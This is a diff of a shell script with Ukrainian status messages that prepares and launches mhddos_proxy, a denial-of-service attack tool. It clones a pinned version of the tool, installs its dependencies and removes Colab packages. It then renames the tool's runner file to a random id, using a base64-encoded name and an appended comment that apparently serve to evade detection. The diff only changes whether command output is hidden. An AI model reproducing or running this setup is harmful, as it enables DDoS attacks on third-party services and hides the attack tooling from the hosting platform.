@@ -90,27 +90,27 @@ PROXY_FILE=$PROXY_DIR/${TOOL}/files/proxies/proxies.txt
 echo "Підготовка середовища для запуску..."
 
 # make sure ifstat and awk are installed
-apt-get install ifstat gawk -y &> /dev/null
+apt-get install ifstat gawk -y #&> /dev/null
 
 # remove unnecessary built-in python dependencies
-python3 -m pip uninstall google-colab datascience -y &> /dev/null
-python3 -m pip install --upgrade pip &> /dev/null
+python3 -m pip uninstall google-colab datascience -y #&> /dev/null
+python3 -m pip install --upgrade pip #&> /dev/null
 
 # run within user directory
 cd ~
 
 # delete old proxy dir if present
 if [ -d $PROXY_DIR ]; then
-    rm -r $PROXY_DIR &> /dev/null
+    rm -r $PROXY_DIR #&> /dev/null
 fi
 
 # download specific mhddos_proxy version
-git clone ${PROXY_PROJECT_URL}.git &> /dev/null
+git clone ${PROXY_PROJECT_URL}.git #&> /dev/null
 cd $PROXY_DIR
-git checkout $PROXY_PROJECT_VERSION &> /dev/null
+git checkout $PROXY_PROJECT_VERSION #&> /dev/null
 
 # install mhddos_proxy dependencies
-python3 -m pip install -r requirements.txt &> /dev/null
+python3 -m pip install -r requirements.txt #&> /dev/null
 
 mv $PROXY_DIR/"$(echo 'cnVubmVyLnB5Cg==' | base64 -d)" $PROXY_DIR/$execution_id.py
 echo "# $execution_id" >> $PROXY_DIR/$execution_id.py
